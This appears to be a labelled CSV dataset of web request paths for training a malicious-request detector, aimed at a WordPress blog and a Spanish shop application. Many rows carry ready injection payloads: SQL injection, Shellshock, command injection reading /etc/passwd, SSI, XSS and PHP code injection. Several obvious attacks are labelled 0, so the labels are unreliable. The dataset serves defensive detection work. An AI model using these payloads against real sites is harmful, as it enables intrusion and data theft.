text,label
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-,1
/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/index.php/tag/nobis-perspiciatis-optio/feed,0
/blog/wp-content/themes/twentyseventeen/assets/js/global.js%22+AND+%221%22%3D%221%22+--+?ver=1.0,1
/blog/%2F/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,0
/blog/index.php/wp-json//1.0/embed?url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2Fvitae-dolores-quidem-possimus-aut-voluptatibus%2F,0
/blog/wp-content/uploads%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/2020/04/38536cfd-4e8b-3340-b4c4-af387cc163a8.jpg,0
/blog/wp-content/uploads/2020/04/1faecdf0-334c-3262-b83f-a897be68c7e2-300x239.png%3Bcat+%2Fetc%2Fpasswd%3B,0
"/tienda1/publico/registro.jsp?modo=registro&login=dipace&password=7arp2ana&nombre=heradio&apellidos=gifre&email=halop-pitti@ubikuo.tv&dni=76916650g&direccion=c/+antoni+ribas,+s/n,+6?h&ciudad=mirabel&cp=08787&provincia=teruel&ntc=2818899710483590&b1=registrar",0
/blog+%2F+sleep%2815%29+/index.php/2020/04,0
/blog/wp-content/uploads/2020/04/4f93f7ba-7b14-35e1-b3b0-df18897c5111.png.gz,0
/blog%22+or+0+in+%28select+sleep%2815%29+%29+--+/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/index.php/2020/03%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/27,1
/blog/wp-content/uploads/%2F11020b88-e0d1-33fa-b269-b7e9f495b02b.jpg/04/11020b88-e0d1-33fa-b269-b7e9f495b02b.jpg,0
/blog/HtTpS%3A%2F%2F8501779237819759495.owasp.org/themes/twentyseventeen/assets/js/skip-link-focus-fix.js?ver=1.0,0
/blog/wp-includes/0W45pz4p/plupload/moxie.min.js?ver=1.3.5,0
/blog/index.php%27%29+PROCEDURE+ANALYSE%28EXTRACTVALUE%283748%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%283748%3D3748%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29+AND+%28%27gtHN%27+LIKE+%27gtHN/2020/03/23,1
/blog/index.php%27%22/my-account/edit-profile?mode=grid,1
/blog/index.php/etc%2Fpasswd/edit-password,0
/post_office/,0
/blog/index.php/2020/03%27%3B%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29AtJP%29%23/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/wp-comments-post.php comment=&author=pluckyMackerel2&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=11&comment_parent=0,0
"/tienda1/miembros/editar.jsp?modo=registro&login=bonny&password=*sepultura&nombre=ives&apellidos=raurell&email=persky-scavran@mystyleperfume.co%00&dni=92230868v&direccion=pomponio+mela+190,+11f&ciudad=rozas+de+puerto+real&cp=37488&provincia=santa+cruz+de+tenerife&ntc=5805853159182957&b1=registrar",1
/blog/wp-content%7Ccat+%2Fetc%2Fpasswd%23/uploads/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143-1024x682.jpg,0
/blog/index.php%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,1
"/tienda1/miembros/editar.jsp?modo=registro&login=aguilar&password=pilar&nombre=lihue&apellidos=ordo�es+abitera&email=tyra@satellites.ic&dni=69458999b&direccion=camino+de+los+almendros,+97,+7-e&ciudad=san+mart�n+de+rubiales&cp=29715&provincia=girona&ntc=6144094340642187&b1=registrar",0
/%22/wp-content/plugins/user-registration/assets/css/sweetalert2/sweetalert2.min.css?ver=8.17.1,1
/blog/index.php/my-account%253Bcat%2B%252Fetc%252Fpasswd%253B/edit-profile/%7B%7B%20data.image.src%20%7D%7D,1
/whatismodperl/,0
/1004357472/,0
/blog%25%27+AND+SLEEP%285%29+AND+%27%25%27%3D%27/index.php/2020/03/23,1
/blog/wp-content/plugins+UNION+ALL+select+NULL+--+/user-registration/assets/js/jquery-tiptip,1
/blog/index.php/URL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/feed/rss2,0
/sitemap.xml%27+OR+%271%27%3D%271%27+--+,1
/blog/wp-content/plugins/user-registration/assets+OR+1%3D1/js,1
/blog/index.php%2526%2526sleep%2B15/my-account/edit-profile/%7B%7B%20data.model.url%20%7D%7D,1
/blog/index.php/qui-enim-sunt-minima-sit/embed%28,1
/%27/index.php/my-account/edit-profile/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D username=blissfulCockatoo8&password=Hu$gb#&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever,1
/tienda1/publico/autenticar.jsp?modo=entrar&login=scates7&pwd=s17500t8&remember=off&b1=entrar,0
/blog/index.php%22+and+0+in+%28select+sleep%2815%29+%29+--+/author/tomas,1
/blog/index.php/2020/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum0W45pz4p/embed,0
/blog/index.php/wp-json/oembed/1.0/embed?url=http%3A%2F%2Ftest-site.com%2Fblog%2Findex.php%2F2020%2F03%2F29%2Fdistinctio-sequi-officiis-occaecati%2F&,0
/blog/HtTpS%3A%2F%2F8501779237819759495.owasp.org/js/underscore.min.js?ver=1.8.3,0
/blog/wp-content/uploads/2020/%3B/38536cfd-4e8b-3340-b4c4-af387cc163a8.jpg,1
/172882/,0
/blog/wp-login.php?action=lostpassword user_login=gutturalDinosaur7&redirect_to=&wp-submit=Get+New+Password,0
/blog/wp-includes/js0W45pz4p/jquery/ui/core.min.js?ver=1.11.4,0
/%2B/wp-content/uploads/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg,0
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%22%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23,1
/blog/index.php%22%29+RLIKE+%28SELECT+%28CASE+WHEN+%289476%3D9476%29+THEN+0x696e6465782e706870+ELSE+0x28+END%29%29+AND+%28%22EYHy%22%3D%22EYHy/2020/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/index.php/2020%22+OR+%221%22%3D%221/04/page/2,1
/tienda1/publico/autenticar.jsp?modo=entrar&login=kenn&pwd=p6o2�n&remember=on&b1=entrar,0
/%2F/index.php/2020/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum/embed,0
/blog/wp-content/uploads/0W45pz4p/04,0
/blog/wp-content/uploads/2020/04/c88a75c6-b439-3e82-99dd-0aca7c568b15-1024x682.jpg%60sleep+15%60,1
/URL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/wp-content/uploads/2020/04/11020b88-e0d1-33fa-b269-b7e9f495b02b-1024x682.jpg,0
/blog/wp-content/uploads/%40/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-32x32.jpg,0
/blog/index.php/2020%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/index.php/2020/5-2/22/quidem-rerum-sit-doloribus-quia-eum,0
/blog/wp-content/uploads/2020/04/c88a75c6-b439-3e82-99dd-0aca7c568b15-1024x682.jpg%27+OR+%271%27%3D%271,1
/blog/index.php/2020/03/23+PROCEDURE+ANALYSE%28EXTRACTVALUE%283953%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28CASE+WHEN+%283953%3D3953%29+THEN+1+ELSE+0+END%29%29%2C0x3a6172743a%29%29%2C1%29/fuga-aut-recusandae-sed-dolor-quia,1
/nav-well/,0
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum%25%27+AND+5433%3D5433--+-/feed,1
/blog/wp-content/uploads/2020/04%22+%2F+sleep%2815%29+%2F+%22/6182beef-7947-3c05-887f-c6de1c49f824.png,0
/blog/index.php/2020%27+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/03/22,1
/blog/wp-includes/js/mediaelement/wp-mediaelement.min.js.7z,0
/blog/wp-content%22+UNION+ALL+select+NULL+--+/uploads/2020/04/6e5c5163-fca7-365f-898b-acced7ed5063.png,1
/blog/index.php/2020/03%25%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/23,1
/blog/wp-content/uploads+OR+1%3D1+--+/2020/04/bdffa507-6fa1-380b-b720-116dfaf00c82-1024x682.jpg,1
/blog/wp-login.php?action=lostpassword user_login=8501779237819759495.owasp.org&redirect_to=&wp-submit=Get+New+Password,0
/blog/wp-content0W45pz4p/uploads/2020/04/4b6aa405-8ac7-33d8-9366-43fcef53f97a-300x239.png,0
/javascript/change.lib,0
/blog%27%3Bcat+%2Fetc%2Fpasswd%3B%27/wp-content/uploads/2020/04/755e6d4b-39f2-3314-89a0-c9a4d1bc3143-1024x682.jpg,0
/blog/wp-includes/js/plupload%22+%2F+sleep%2815%29+%2F+%22/wp-plupload.min.js?ver=4.9.5,0
/blog/index.php/my-account/edit-profile/Copy%20of%20Copy%20of%20%7B%7B%20data.link%20%7D%7D,0
/blog/wp-includes/js/wp-backbone.min.js?ver=%2F,0
/blog/index.php/https%3A%2F%2F8501779237819759495.owasp.org/04/04/explicabo-qui-fuga-distinctio-dolores-voluptatibus-sit,0
/blog/index.php/2020%27%29+RLIKE+%28SELECT+%28CASE+WHEN+%286892%3D5685%29+THEN+2020+ELSE+0x28+END%29%29+AND+%28%27PcGk%27+LIKE+%27PcGk/03/27,1
/tienda1/global/menum.jsp/~,1
/tienda1/publico/registro.jsp?modo=registro&login=kundert&password=monesca&nombre=ante&apellidos=altirriba+pava&email=lowry-carmine@filtraciondehumos.nc&dni=70212042b&direccion=c/+mercurio+165+4e&ciudad=san+mart�n+de+la+virgen+de+moncayo&cp=03773&provincia=navarra&ntc=9471070680051511&b1=registrar');waitfor+delay+'0:0:15';--,1
/blog%27%3Bsleep+15%3B%27/index.php/my-account/edit-password username=puzzledLemur4&password=LN3Wljk8&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,1
/blog/wp-content/%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E/2020/04/914665e4-4fbd-3377-9747-d24ebaabf676-300x240.png,0
/blog/index.php/2020/%5C%5C8501779237819759495.owasp.org/04/voluptas-alias-ut-iure-dicta-aliquid-corrupti,0
/%3C%21--/wp-includes/js/comment-reply.min.js?ver=4.9.5,1
/blog/wp-comments-post.php comment=&submit=https%3A%2F%2F8501779237819759495.owasp.org&comment_post_ID=56&comment_parent=0,0
/blog/wp-content/plugins/user-registration/assets/js%60sleep+15%60/inputmask/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58,1
/blog+UNION+ALL+SELECT+NULL--+-/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur,1
/blog/wp-includes/js/wp-util.min.js?ver=c%3A%2F,0
/blog/wp-login.php?action=register user_login=obsessedCamel4&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,0
/blog/wp-content/uploads/2020/04/ca053e21-2e95-34b7-a64b-a8ef08169a27-1024x682.jpg%22%3Bcat+%2Fetc%2Fpasswd%3B%22,0
/blog/index.php/my-account%22+OR+%221%22%3D%221%22+--+/edit-profile/post.php?action=edit&post=%7B%7B%20data.id%20%7D%7D,1
/blog/index.php/my-account/%253C%2521--/%7B%7B%20attachment.url%20%7D%7D,1
/blog/wp-content/plugins/user-registration%22%3Bsleep+15%3B%22/assets/js/jquery-tiptip,1
/blog%27/wp-content/themes/twentyseventeen/assets/images/header.jpg,1
/blog/index.php/2020%22+%2F+sleep%2815%29+%2F+%22/04/04/consequatur-ad-error-quidem/embed,0
/%2B/wp-content/plugins/user-registration/assets/css/user-registration-smallscreen.css?ver=1.8.2.1,0
/blog/index.php/2020/03/0W45pz4p/quidem-rerum-sit-doloribus-quia-eum/embed,0
/blog/my-account%27+AND+%271%27%3D%271%27+--+,1
/blog/index.php/sample-page/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/embed,0
/blog/index.php+AND+EXTRACTVALUE%287513%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28ELT%287513%3D7513%2C1%29%29%29%2C0x3a6172743a%29%29--+aFQJ/2020/03/29/distinctio-sequi-officiis-occaecati/embed,1
/blog/wp-content/8501779237819759495.owasp.org/2020/04/02020950-6e37-3272-9dbf-3093969e3563.jpg,0
/blog/%2F%2F8501779237819759495.owasp.org/uploads/2020/04/27f17687-adda-3ce6-9767-0037ea74eec2.png,0
/8501779237819759495.owasp.org/wp-includes/js/plupload/plupload.min.js?ver=2.1.9,0
/blog/http%3A%2F%2F8501779237819759495.owasp.org/js/mediaelement/wp-mediaelement.min.js?ver=4.9.5,0
/blog/index.php%27%29+AND+3765%3D3899+AND+%28%27tKkn%27%3D%27tKkn/2020/03/22/quidem-rerum-sit-doloribus-quia-eum,1
/blog/wp-content/uploads/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3.jpg%60cat+%2Fetc%2Fpasswd%60,0
/blog/index.php/sample-page/nulla-quisquam-est-ut-nemo/%2Fetc%2Fpasswd,0
/blog/index.php/2020%3B%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29xxAP%29/03/23,1
/blog/%7C/sample-page/amet-et-deleniti-tenetur-minima,0
/blog/wp-content/uploads%22%3Bcat+%2Fetc%2Fpasswd%3B%22/2020/04/cropped-587d69f7-b2e2-363b-b76a-5fd0bcf0c834-1-192x192.jpg,0
/blog/zApPX1361sS/sample-page/ut-aspernatur-est-dolores,0
/blog/wp-content/%7C/2020/04/c357e14e-0af5-317e-a4f7-bc609b90087b.jpg,0
/blog/wp-content%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/themes/twentyseventeen/assets/js/jquery.scrollTo.js?ver=2.1.2,0
/blog%22%26cat+%2Fetc%2Fpasswd%26%22/wp-content/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702-300x240.png,0
/lucifer48_hexworkshop322-50/,0
/blog/index.php/2020+or+0+in+%28select+sleep%2815%29+%29+--+/03/22/quidem-rerum-sit-doloribus-quia-eum/embed,1
/blog/wp-content/uploads/2020/04/48cf902e-a565-3e60-8512-c19e2e6a72db-300x200.orig,0
/blog/wp-content//2020/04/4f93f7ba-7b14-35e1-b3b0-df18897c5111.png,0
/blog/index.php%29+UNION+ALL+SELECT+NULL%23/2020/03/22/quidem-rerum-sit-doloribus-quia-eum/feed,1
/%27%22/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur/feed,1
/blog/wp-content/uploads/2020/04/1faecdf0-334c-3262-b83f-a897be68c7e2-300x239.7z,0
/blog/index.php%27+OR+%271%27%3D%271/search/tradition/feed,1
/blog/index.php/2020/04/04/labore-pariatur-amet-quam/feed%27+AND+%271%27%3D%271%27+--+,1
/blog/index.php/my-account/https%253A%255C%255C8501779237819759495.owasp.org/%7B%7B%20data.uploadedToLink%20%7D%7D,1
/blog/index.php/2020/03/27%22+AND+7578%3D7578+AND+%22qaLs%22%3D%22qaLs/qui-ratione-maxime-dolores-consequatur,1
/blog/index.php/my-account+where+0+in+%28select+sleep%2815%29+%29+--+/user-logout?_wpnonce=14237a84a5 username=lyingPretzels5&password=CG2M4E&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fuser-logout%2F%3F_wpnonce%3D14237a84a5&login=Login&redirect=&rememberme=forever,1
/blog+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php,1
/blog/index.php/my-account/edit-profile/%7B%7B%20data.sizes.medium.~bk.url%20%7D%7D,0
/blog/https%3A%2F%2F8501779237819759495.owasp.org/uploads/2020/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg,0
/HtTp%3A%2F%2F8501779237819759495.owasp.org/wp-includes/js/jquery/ui/sortable.min.js?ver=1.11.4,0
/blog/wp-content/plugins/user-registration/assets/js/frontend/user-registration.min.js?ver=%27,1
/blog%27%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/index.php,1
/blog%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php/2020/03/29,1
/demographic-mapping/,0
/blog/index.php/HtTpS%3A%2F%2F8501779237819759495.owasp.org/03/23/fuga-aut-recusandae-sed-dolor-quia,0
/blog/index.php%22%26cat+%2Fetc%2Fpasswd%26%22/registration/embed,0
/blog/index.php/2020/03/23%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-,1
/blog/index.php%25%27%3BSELECT+SLEEP%285%29%23/2020/03/22,0
/blog/wp-content/uploads/2020/04/e3780f73-5198-35c8-8ece-d2d4feda884e-1024x682.jpg.tar,0
/blog/index.php/2020/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/04/page/2,0
/blog/wp-content/uploads/5%3BURL%3D%27http%3A%2F%2F8501779237819759495.owasp.org%27/04,0
/blog/index.php/https%3A%5C%5C8501779237819759495.owasp.org/04/04/hic-porro-nihil-non-rerum,0
/blog+%2F+sleep%2815%29+/index.php/2020/04/04/rerum-soluta-et-quis-excepturi-labore,0
/blog/index.php/2020%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23/03/29/distinctio-sequi-officiis-occaecati,1
/blog/wp-content%29/uploads/2020/04/b476e717-efec-3b0d-80e9-13c6400a7702.png,1
/blog/wp-content/themes%26%26cat+%2Fetc%2Fpasswd/twentyseventeen/assets/js/html5.js?ver=3.7.3,0
/c%3A%2F/wp-content/uploads/2020/04/d2ac875b-15d8-3412-9205-17afbf0ba62d.jpg,0
/046919/,0
/blog/index.php/2020/04/04/inventore-asperiores-adipisci-cum-facere-voluptatem-rerum%22+OR+%221%22%3D%221%22+--+/embed,1
/blog/index.php%27%29%29+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29Zhfz%29+AND+%28%28%27DEkB%27%3D%27DEkB/2020/03/27/qui-ratione-maxime-dolores-consequatur/embed,1
/%00/wp-includes/js/mediaelement/wp-mediaelement.min.css?ver=4.9.5,0
/blog+OR+1%3D1/wp-content/uploads/2020/04/914665e4-4fbd-3377-9747-d24ebaabf676.png,1
/blog/wp-content/uploads/2020/c%3A%5C/ca053e21-2e95-34b7-a64b-a8ef08169a27-1024x682.jpg,0
/blog/index.php/my-account/edit-profile/%7B%7B+data.icon%29+UNION+ALL+select+NULL+--+,1
/blog/index.php/2020/03/22/quidem-rerum-sit-doloribus-quia-eum%25%27+AND+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29QUwy%29+AND+%27%25%27%3D%27,1
/blog/index.php/2020/04/04/animi-sint-ut-sed-commodi/embed%22+AND+%221%22%3D%222%22+--+,1
/blog/index.php/my-account/edit-password/ username=yearningMussel1&password=Y6!liz&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-password%2F&login=Login&redirect=&rememberme=forever,1
/blog/index.php/rerum-ut-error-ex-dolores-rerum%22%26cat+%2Fetc%2Fpasswd%26%22,0
/blog/wp-content/%00/2020/04/6b2fa1b9-c963-3881-90e3-4f13ffe1c2d3.jpg,0
/blog/index.php/author/sipes-nolan%25,0
/blog/index.php/2020/03/23%22%29+AND+EXTRACTVALUE%283659%2CCONCAT%280x5c%2C0x3a727a613a%2C%28SELECT+%28ELT%283659%3D3659%2C1%29%29%29%2C0x3a6172743a%29%29+AND+%28%22qRZv%22%3D%22qRZv/fuga-aut-recusandae-sed-dolor-quia,1
/blog/index.php+or+0+in+%28select+sleep%2815%29+%29+--+/2020/04/04/rerum-soluta-et-quis-excepturi-labore/feed,1
/blog/wp-content%20-%20Copy%20(2)/uploads,0
/blog%27%29%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/index.php,1
/blog/c%3A%5C/js/api-request.min.js?ver=4.9.5,0
/blog/wp-content/plugins/user-registration/assets/js%22+or+0+in+%28select+sleep%2815%29+%29+--+/frontend/lost-password.min.js?ver=1.8.2.1,1
/blog/index.php/2020/03%22%29+AND+ROW%288869%2C4056%29%3E%28SELECT+COUNT%28*%29%2CCONCAT%280x3a727a613a%2C%28SELECT+%28ELT%288869%3D8869%2C1%29%29%29%2C0x3a6172743a%2CFLOOR%28RAND%280%29*2%29%29x+FROM+%28SELECT+5502+UNION+SELECT+2477+UNION+SELECT+4251+UNION+SELECT+9588%29a+GROUP+BY+x%29+AND+%28%22Oqva%22%3D%22Oqva/27/qui-ratione-maxime-dolores-consequatur,1
/%2528%2529%2B%257B%2B%253A%253B%257D%253B%2B%252Fbin%252Fsleep%2B15/index.php/my-account/edit-profile/%7B%7B%20data.url,1
/blog/wp-content/themes/twentyseventeen/assets/js/global.~bk.js,0
/blog/index.php/2020/03%29+UNION+ALL+SELECT+NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--+-/27/qui-ratione-maxime-dolores-consequatur,1
/blog/wp-includes/%27%22/imgareaselect/imgareaselect.css?ver=0.9.8,1
/blog/index.php/2020/04%27%26cat+%2Fetc%2Fpasswd%26%27/04/ipsa-ea-porro-distinctio/feed,0
/blog/wp-includes/https%3A%5C%5C8501779237819759495.owasp.org/jquery/ui,0
/blog/index.php/search/feed/rss2%60cat+%2Fetc%2Fpasswd%60,0
/blog/wp-includes/%00/shortcode.min.js?ver=4.9.5,0
/blog/wp-content%27+and+0+in+%28select+sleep%2815%29+%29+--+/uploads/2020/04/f51dfb19-3fe8-380e-91a6-3912fdae661e.jpg,1
/blog/wp-content/uploads/2020/04/e3780f73-5198-35c8-8ece-d2d4feda884e.bac.jpg,0
/NULL/wp-login.php?loggedout=true,1
/blog/index.php/category+AND+1%3D1+--+,1
/blog/index.php/my-account/edit-profile/post.php%22%29+UNION+ALL+select+NULL+--+?action=edit&post=%7B%7B%20data.id%20%7D%7D username=joyfulPoultry8&password=QHjYkg#W&user-registration-login-nonce=6eac0e2d5f&_wp_http_referer=%2Fblog%2Findex.php%2Fmy-account%2Fedit-profile%2Fpost.php%2F%3Faction%3Dedit%26post%3D%257B%257B%2520data.id%2520%257D%257D&login=Login&redirect=&rememberme=forever,1
/blog/index.php%27+AND+%271%27%3D%272%27+--+/tag/pariatur-eum-illo,1
/blog/index.php/2020/%5Cpage/page,0
rexach donada,0
/blog/wp-content/uploads/2020/04/c88a75c6-b439-3e82-99dd-0aca7c568b15-1024x682.jpg%22%26cat+%2Fetc%2Fpasswd%26%22,0
/blog/wp-content/themes/twentyseventeen/assets/js.exe,0
/blog/wp-login.php+%2F+sleep%2815%29+?_wpnonce=7de0abcdc2&action=logout,0
/blog/wp-login.php%27+and+0+in+%28select+sleep%2815%29+%29+--+?action=register user_login=mellowMuesli3&user_email=foo-bar%40example.com&redirect_to=&wp-submit=Register,1
/blog/wp-content/plugins/user-registration/assets/%29/frontend/user-registration.min.js?ver=1.8.2.1,1
/blog/index.php/HtTpS%3A%2F%2F8501779237819759495.owasp.org/04/04/consequatur-ad-error-quidem,0
/blog/%28%29+%7B+%3A%3B%7D%3B+%2Fbin%2Fsleep+15/nobis-tenetur-exercitationem-similique/embed,0
/blog/index.php/nobis-tenetur-exercitationem-similique/1276221339758749785,0
/blog/wp-content/plugins/user-registration%27+or+0+in+%28select+sleep%2815%29+%29+--+/assets/js/inputmask/jquery.inputmask.bundle.min.js?ver=4.0.0-beta.58,1
/blog/index.php/2020/03/23/fuga-aut-recusandae-sed-dolor-quia%27%29+RLIKE+%28SELECT+*+FROM+%28SELECT%28SLEEP%285%29%29%29AmsA%29+AND+%28%27XpXW%27+LIKE+%27XpXW/embed,1
/blog+AND+SLEEP%285%29/index.php/2020/03/29/distinctio-sequi-officiis-occaecati,1
/blog/index.php/search/currency%60cat+%2Fetc%2Fpasswd%60/feed,0
/blog/wp-content/uploads/2020/%27%22%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E/814f0d47-97c4-3681-b8a4-2cd7f3a93119-1024x682.jpg,0
/blog/index.php/2020/03%25/29/distinctio-sequi-officiis-occaecati,0
/%2B/index.php/tag/at-quos-nesciunt-in-amet/feed,0
/blog/index.php/fugiat-recusandae-voluptatem-ratione-quo-placeat/feed%27+where+0+in+%28select+sleep%2815%29+%29+--+,1
/blog/wp-includes/js/media-models.min.js.exe,0
/javascript/mlist.asp,0
/blog/wp-content/uploads/c%3A%2F/04/4eb284d3-cf2e-320a-949c-44cf6c5433a9.jpg,0
/blog/index.php/03/29/distinctio-sequi-officiis-occaecati/feed/,0
/blog/wp-content/themes/twentyseventeen%7C%7Csleep+15/assets/js/skip-link-focus-fix.js?ver=1.0,1
/tienda1/publico/anadir.jsp?id=3&nombre=jam�n+ib�rico&precio=100&cantidad=98&b1=a�adir+al+carrito,0
/blog/index.php/2020/04/04%26cat%24jj+%24jj%2Fetc%24jj%2Fpasswd%26/consequatur-ad-error-quidem,0
/javascript/efforts.exe,1
/blog%3Bcat+%2Fetc%2Fpasswd%3B/index.php/2020/04/page,0
/blog/wp-comments-post.php comment=&author=grizzledBustard3&email=foo-bar%40example.com&url=http%3A%2F%2Fwww.example.com&submit=Post+Comment&comment_post_ID=11&comment_parent=0,0
/blog%22+and+0+in+%28select+sleep%2815%29+%29+--+/index.php/tag/nihil-ut-deleniti-est,1
/tienda1/publico/pagar.jsp?modo=insertar&precio=3116&b1=pasar+por+caja,0
/blog/index.php/my-account/%2522%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B%2524var%253D%2522/%7B%7B%20data.size.url%20%7D%7D,1
/blog/index.php/2020/03/27/qui-ratione-maxime-dolores-consequatur%22%29+UNION+ALL+SELECT+NULL%23/feed,1
/blog/index.php/2020/03/23%22+AND+8262%3D8262+AND+%22yNeG%22%3D%22yNeG,1
/1651381/,0
